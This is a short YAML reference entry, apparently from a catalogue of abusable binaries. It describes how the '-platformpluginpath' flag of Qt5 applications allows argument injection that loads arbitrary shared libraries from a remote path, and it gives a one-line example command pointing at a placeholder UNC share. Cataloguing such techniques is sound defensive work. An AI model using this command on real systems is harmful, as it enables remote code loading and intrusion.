---
description: Qt5 applications accept common command-line flags that can be abused for argument injection. This affects any application built with Qt5.
functions:
  command:
    - description: The `-platformpluginpath` flag can be used to load arbitrary shared libraries from a remote path.
      code: |
        qt5_app -platformpluginpath \\foo\bar
---
